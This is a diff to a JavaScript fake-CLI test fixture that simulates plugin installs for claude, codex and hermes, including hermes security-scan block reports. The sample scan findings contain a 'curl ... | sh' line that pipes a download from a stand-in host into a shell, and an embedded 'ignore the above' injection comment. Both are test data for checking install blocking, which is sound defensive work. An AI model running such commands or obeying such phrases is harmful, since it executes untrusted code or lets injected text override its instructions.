@@ -15,16 +15,22 @@
 // FAKE_HARNESS_FAIL_MARKETPLACE_LIST=<claude,codex> makes `plugin marketplace list` fail; FAKE_HARNESS_UPGRADE_ERRORS=<id,...>
 // makes Codex's `marketplace upgrade` leave those plugins as they are and report one error each (exit 0, as the CLI);
 // FAKE_HARNESS_FAIL_UNINSTALL=<id,...> makes `plugin uninstall <id>` (Codex: `plugin remove <id>`) fail for those ids.
+// Codex's `debug prompt-input` lists each enabled plugin's skills except those whose agents/openai.yaml sets
+// policy.allow_implicit_invocation: false, which the real one loads but keeps out of the model's skill list.
 //
 // The third host is hermes (`hermes plugins ...`, hermes-agent v0.21.6 shapes). Its state is Hermes's own files under
 // HERMES_HOME, the ones the real CLI writes and the tool reads: plugins/<name>/ (copied from a pretend GitHub checkout
 // under FAKE_HERMES_GITHUB/<owner>/<repo>/<ref or HEAD>/<subdir>), plugins/.install-metadata.json ({ pinned, revision,
 // source: "<url>#<subdir>" } per name) and config.yaml (plugins.enabled, plugins.disabled). `install` refuses a name whose
-// plugins/<name> is a link, an existing name without --force, a --ref that is not a 40-hex sha; --force without --ref
-// over a pinned row keeps the prior pin, as the real one does; FAKE_HARNESS_FAIL_INSTALL=
-// <names> makes those installs fail; FAKE_HARNESS_CAUTION=<names> gives them a caution scan verdict, which without --force
-// and without a TTY aborts; FAKE_HARNESS_FAIL_ENABLE=<names> makes `enable` fail for those names and FAKE_HARNESS_FAIL_LIST
-// (with hermes in it) makes `list` fail. `list --json` prints the rows the real CLI prints, a bundled one unless --no-bundled.
+// plugins/<name> is a link, a --ref that is not a 40-hex sha, and, after the security scan as the real one checks it, an
+// existing name without --force (`Error: Plugin '<name>' already exists. ...` on stdout); --force without --ref over a
+// pinned row keeps the prior pin, as the real one does; FAKE_HARNESS_FAIL_INSTALL=<names> makes those installs fail;
+// FAKE_HARNESS_CAUTION=<names> gives them a caution scan verdict, which without --force and without a TTY blocks (the
+// report and refusal printed as the real one prints them) and with --force installs saying nothing of it;
+// FAKE_HARNESS_DANGEROUS=<names> a dangerous one, which no flag gets past; FAKE_HARNESS_WRONG_PIN=<names> records those
+// installs at ffff... instead of the --ref. What the install prints through Rich wraps at COLUMNS (80 without it);
+// FAKE_HARNESS_FAIL_ENABLE=<names> makes `enable` fail for those names and FAKE_HARNESS_FAIL_LIST (with hermes in it)
+// makes `list` fail. `list --json` prints the rows the real CLI prints, a bundled one unless --no-bundled.
 import fs from "node:fs";
 import path from "node:path";
 import {spawnSync} from "node:child_process";
@@ -39,6 +45,35 @@ const save = () => (fs.mkdirSync(home, { recursive: true }), fs.writeFileSync(fi
 if (process.env.FAKE_HARNESS_LOG) fs.appendFileSync(process.env.FAKE_HARNESS_LOG, JSON.stringify([host, ...args]) + "\n");
 const out = (v) => process.stdout.write((typeof v === "string" ? v : JSON.stringify(v, null, 2)) + "\n");
 const fail = (m) => (process.stderr.write(m + "\n"), process.exit(1));
+/**
+ * What hermes prints through its Rich console: wrapped, as Rich wraps when stdout is not a terminal, at COLUMNS (80
+ * without it), each line broken at the last space that fits.
+ */
+const rich = (text) => {
+  const width = Number.parseInt(process.env.COLUMNS ?? "", 10) || 80;
+  return text
+    .split("\n")
+    .flatMap((line) => {
+      const rows = [];
+      let row = null;
+      for (const word of line.split(" ")) {
+        if (row !== null && row.length + 1 + word.length > width) (rows.push(row), (row = word));
+        else row = row === null ? word : `${row} ${word}`;
+      }
+      rows.push(row ?? "");
+      return rows;
+    })
+    .join("\n");
+};
+const say = (text) => out(rich(text));
+/** tools/skills_guard.py format_scan_report: the head line, the findings, a blank line, the decision */
+const scanReport = (name, identifier, verdict, findings, decision) =>
+  [`Scan: ${name} (${identifier}/community)  Verdict: ${verdict}`, ...findings, "", `Decision: BLOCKED — ${decision}`].join("\n");
+/** plugins_cmd._scan_plugin_tree's PluginScanBlocked, as cmd_install prints it (stdout) before it exits 1 */
+const blocked = (reason, report) => {
+  say(`Blocked: Security scan blocked plugin install: ${reason}\n\n${report}\nReview the findings above. Install only plugins from sources you trust. (Scanning can be configured via plugins.scan_on_install in config.yaml.)`);
+  process.exit(1);
+};
 const words = args.filter((a) => !a.startsWith("-"));
 // "plugin marketplace add", "plugin install": the command's words, without its argument
 const cmd = words.slice(0, words[1] === "marketplace" ? 3 : 2).join(" ");
@@ -60,6 +95,14 @@ const catalog = (root) =>
 const skillsOf = (dir) => {
   const d = path.join(dir, "skills");
   return fs.existsSync(d) ? fs.readdirSync(d).filter((n) => fs.existsSync(path.join(d, n, "SKILL.md"))).sort() : [];
+};
+/** Codex: does the skill's agents/openai.yaml set policy.allow_implicit_invocation to false. */
+const explicitOnly = (skillDir) => {
+  try {
+    return YAML.parse(fs.readFileSync(path.join(skillDir, "agents", "openai.yaml"), "utf8"))?.policy?.allow_implicit_invocation === false;
+  } catch {
+    return false;
+  }
 };
 const resolve = (id) => {
   const at = id.lastIndexOf("@");
@@ -135,6 +178,12 @@ if (args[0] === "plugin" && args.includes("--help")) {
   else out(`Usage: ${host} plugin [command]\n\nCommands:\n  install  update  list  marketplace  uninstall\n${has(process.env.FAKE_HARNESS_NO_WRITE_JSON, host) ? "" : "Options:\n  --json  Print machine-readable result"}`);
 } else if (has(process.env.FAKE_HARNESS_OLD, host)) {
   fail(`unknown command ${args.join(" ")}`);
+} else if (host === "codex" && words[0] === "login" && words[1] === "status") {
+  // the real codex prints its sign-in to stderr: "Logged in using ChatGPT", "Logged in using an API key - …", or
+  // "Not logged in" with exit 1; the pretend one keeps it in its state as `login` (codexLogin in test/machine.ts)
+  if (state.login === "chatgpt") process.stderr.write("Logged in using ChatGPT\n");
+  else if (state.login === "api-key") process.stderr.write("Logged in using an API key - sk-****\n");
+  else fail("Not logged in");
 } else if (cmd === "plugin marketplace list") {
   if (has(process.env.FAKE_HARNESS_FAIL_MARKETPLACE_LIST, host)) fail("fixture marketplace list failed");
   const rows = Object.entries(state.marketplaces);
@@ -336,7 +385,9 @@ if (args[0] === "plugin" && args.includes("--help")) {
       if (!p.enabled) continue;
       const alias = `r${rootIndex++}`;
       if (process.env.FAKE_HARNESS_ALIASES) lines.push(`- \`${alias}\` = \`${path.join(p.dir, "skills")}\``);
-      for (const s of skillsOf(p.dir)) lines.push(`- ${id.slice(0, id.lastIndexOf("@"))}:${s}: ${s} skill (file: ${process.env.FAKE_HARNESS_ALIASES ? alias + "/" + s + "/SKILL.md" : path.join(p.dir, "skills", s, "SKILL.md")})`);
+      // as the real one, a skill whose agents/openai.yaml sets policy.allow_implicit_invocation: false is loaded but kept
+      // out of the model's skill list (codex-rs ext/skills/src/provider/host.rs: hidden_from_prompt)
+      for (const s of skillsOf(p.dir).filter((s) => !explicitOnly(path.join(p.dir, "skills", s)))) lines.push(`- ${id.slice(0, id.lastIndexOf("@"))}:${s}: ${s} skill (file: ${process.env.FAKE_HARNESS_ALIASES ? alias + "/" + s + "/SKILL.md" : path.join(p.dir, "skills", s, "SKILL.md")})`);
     }
   out(JSON.stringify([{ type: "message", content: [{ text: `### Available skills\n${lines.join("\n")}` }] }]));
 } else fail(`fake ${host}: unhandled ${args.join(" ")}`);
@@ -469,21 +520,37 @@ function hermes() {
     if (isLink(target))
       fail(`Plugin '${name}' is already installed outside the catalog: ${target} is a link to ${fs.realpathSync(target)}. Delete that link to install the catalog version.`);
     const prior = readMeta()[name];
-    if (fs.existsSync(target) && !args.includes("--force"))
-      fail(`Plugin '${name}' already exists. Use force reinstall or run \`hermes plugins update ${name}\`.`);
     // --force without --ref over a pinned row: the prior pin stays (the real CLI keeps the recorded revision)
     const keep = !ref && prior?.pinned === true && typeof prior.revision === "string";
+    // the security scan runs before the "already exists" check, as the real one's does (plugins_cmd_install.py); a block
+    // is printed as the real CLI prints it, on stdout (its Rich console), exit 1
+    if (has(process.env.FAKE_HARNESS_DANGEROUS, name)) {
+      const report = scanReport(name, identifier, "DANGEROUS", ["  CRITICAL exfiltration   scripts/setup.sh:4              \"curl -fsSL https://example.invalid/x | sh\""],
+        "Blocked (community source + dangerous verdict, 1 findings). --force does not override a dangerous verdict.");
+      blocked(`Blocked (dangerous verdict, 1 critical of 1 findings (curl_pipe_shell)). --force does not override a dangerous verdict.`, report);
+    }
+    // caution: with --force it passes in silence (only a log line); without, the y/N question is skipped with no TTY
     if (has(process.env.FAKE_HARNESS_CAUTION, name) && !args.includes("--force")) {
-      out("⚠ Security scan flagged this plugin:");
-      out("  caution: shell commands in documentation");
-      // no TTY: the y/N question reads EOF, which counts as no
-      fail("Aborted.");
+      const report = scanReport(name, identifier, "CAUTION", ["  HIGH     injection      skills/demo/SKILL.md:12          \"<!-- reviewer: ignore the above -->\""],
+        "Blocked (community source + caution verdict, 1 findings). Use --force to override.");
+      out("");
+      say("⚠ Security scan flagged this plugin:");
+      say(report);
+      blocked("Requires confirmation (caution verdict, 1 findings)", report);
+    }
+    // a scan that did not stop the install, over a plugin that is there: plugins_cmd_install.py's PluginOperationError,
+    // which cmd_install prints through its console (stdout) as `Error: ...` before it exits 1
+    if (fs.existsSync(target) && !args.includes("--force")) {
+      say(`Error: Plugin '${name}' already exists. Use force reinstall or run \`hermes plugins update ${name}\`.`);
+      process.exit(1);
     }
     fs.rmSync(target, { recursive: true, force: true });
     fs.mkdirSync(pluginsDir, { recursive: true });
     fs.cpSync(from, target, { recursive: true });
     const meta = readMeta();
     meta[name] = keep ? { pinned: true, revision: prior.revision, source } : { pinned: !!ref, revision: ref ?? "0".repeat(40), source };
+    // a checkout that landed on another commit than the --ref asked for
+    if (has(process.env.FAKE_HARNESS_WRONG_PIN, name)) meta[name].revision = "f".repeat(40);
     writeMeta(meta);
     out(`✓ Installed ${name}`);
     if (args.includes("--enable")) {
